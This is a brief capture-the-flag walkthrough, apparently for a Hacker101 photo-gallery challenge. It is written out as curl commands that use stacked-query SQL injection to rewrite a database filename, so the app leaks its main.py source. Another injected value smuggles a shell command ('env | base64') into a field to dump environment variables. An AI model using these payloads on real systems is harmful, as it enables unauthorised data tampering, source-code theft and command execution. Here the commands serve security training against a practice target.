Description: This attack teaches you some advanced SQL using UPDATE, stacked query, SET and COMMIT. With assistance from sqlmap.

**The Attack:**  
We will use a stacked query to change the filename of Photo #1 from files/adorable.jpg to main.py (the standard name for a Flask app file).

**Run this exactly on your VPS:**

```
# 1. Update the filename to main.py and COMMIT the change
curl "https://862a4b8ea6440808a6f68b56f32cc977.ctf.hacker101.com/fetch?id=1;UPDATE%20photos%20SET%20filename='main.py'%20WHERE%20id=1;COMMIT;"

# 2. Now 'fetch' photo #1. Instead of a kitten, it will send you the Python code!
curl -s "https://862a4b8ea6440808a6f68b56f32cc977.ctf.hacker101.com/fetch?id=1" > leaked_source.py

# 3. Search for the flag in the code
grep "flag" leaked_source.py
```
### Search the Environment for Flag 1

You saw UWSGI_RELOADS=0 earlier. Let's see the entire environment list. We will use base64 to make sure we don't lose any characters.

**Run this on your VPS:**
```
# This encodes the environment variables so the 'last line' rule can't cut them
curl "https://862a4b8ea6440808a6f68b56f32cc977.ctf.hacker101.com/fetch?id=1;UPDATE%20photos%20SET%20filename=';env%20|%20base64%20-w%200%20%23'%20WHERE%20id=1;COMMIT;"
```

**Now, grab the code from the homepage:**
```
curl -s "https://862a4b8ea6440808a6f68b56f32cc977.ctf.hacker101.com/"
```
Take that long string of random letters and **decode it as base64.